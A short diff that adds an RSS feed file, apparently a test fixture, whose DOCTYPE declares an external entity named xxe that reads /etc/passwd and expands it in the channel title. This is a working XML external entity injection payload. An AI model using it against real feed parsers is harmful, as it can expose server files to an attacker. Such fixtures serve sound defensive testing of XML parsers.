@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<rss version="2.0">
+  <channel>
+    <title>&xxe;</title>
+    <link>https://example.com/</link>
+  </channel>
+</rss>
